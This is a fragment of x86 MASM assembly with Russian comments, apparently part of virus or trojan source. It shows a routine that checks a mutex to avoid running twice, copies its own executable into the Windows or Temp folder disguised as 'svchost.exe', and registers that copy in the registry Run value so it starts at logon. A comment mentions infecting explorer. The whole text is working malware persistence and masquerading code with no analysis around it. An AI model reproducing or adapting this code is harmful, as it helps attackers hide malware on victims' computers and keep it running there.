IfNotAdmin proc Delta:DWORD
LOCAL BufferForOwnFileName:DWORD
LOCAL BufferForNewFileName:DWORD
LOCAL BufferForWindows:DWORD
LOCAL hKey:DWORD
LOCAL IsWindows:DWORD

jmp IfNotAdminCode
	StrFile db "\svchost.exe",0
	StrReg	db "Software\Microsoft\Windows NT\CurrentVersion\Windows",0
	StrRun	db "Run",0
IfNotAdminCode:
	startproc
	mov ebx,Delta
;Проверяем есть ли мы в системе
	lea eax,[ebx+MutexName]
	push eax
	push 0
	push STANDARD_RIGHTS_READ
	apiproc _OpenMutexA
	.if eax!=0
		push 0
		apiproc _ExitProcess
		endproc
		ret
	.endif
;Выделяем буфер
	push ebx
	call AllocBuffer
	mov BufferForOwnFileName,eax
;Получаем свое имя
	push 255
	push eax
	push 0
	apiproc _GetModuleFileNameA
;Выделяем буфер
	push ebx
	call AllocBuffer
	mov BufferForWindows,eax
;Получаем новое имя
	push 255
	push eax
	apiproc _GetWindowsDirectoryA
;Складываем системное имя с именем svchost.exe
	lea eax,[ebx+StrFile]
	push eax
	push BufferForWindows
	apiproc _lstrcatA
;Копируем свое тело в папку Temp
	push 0
	push BufferForWindows
	push BufferForOwnFileName
	apiproc _CopyFileA
	.if eax!=0;Скопировали в папку виндовс
		mov IsWindows,1;Мы смогли скопировать файл в папку Windows. Так происходит на 2000 винде, т.к. заразить експлорер мы не можем.
	.elseif;Облом :-( Копируем в темп.
		push ebx
		push BufferForWindows
		call FreeBuffer
;Выделяем буфер
		push ebx
		call AllocBuffer
		mov BufferForNewFileName,eax
;Получаем новое имя
		push eax
		push 255
		apiproc _GetTempPathA
;Складываем системное имя с именем svchost.exe
		lea eax,[ebx+StrFile]
		push eax
		push BufferForNewFileName
		apiproc _lstrcatA
;Копируем свое тело в папку Temp
		push 1
		push BufferForNewFileName
		push BufferForOwnFileName
		apiproc _CopyFileA
		mov IsWindows,0
	.endif
;Регистрируем в авторане
	lea eax,hKey
	push eax
	lea eax,[ebx+StrReg]
	push eax
	push HKEY_CURRENT_USER
	apiproc _RegOpenKeyA
	.if eax==ERROR_SUCCESS
		.if IsWindows==0
			push BufferForNewFileName
			apiproc _lstrlenA

			push eax
			push BufferForNewFileName
			push REG_SZ
			push 0
			lea eax,[ebx+StrRun]
			push eax
			push hKey
			apiproc _RegSetValueExA
		.elseif
			push BufferForWindows
			apiproc _lstrlenA
			
			push eax
			push BufferForWindows
			push REG_SZ
			push 0
			lea eax,[ebx+StrRun]
			push eax
			push hKey
			apiproc _RegSetValueExA
		.endif
	.endif
;Очищаем буфера 
	push ebx
	push BufferForWindows
	call FreeBuffer
	
	push ebx
	push BufferForOwnFileName
	call FreeBuffer

	push ebx
	push BufferForNewFileName
	call FreeBuffer
;Работаем как обычно работет эксплорер
	push ebx
	call ThreadProc
	endproc
	ret
IfNotAdmin endp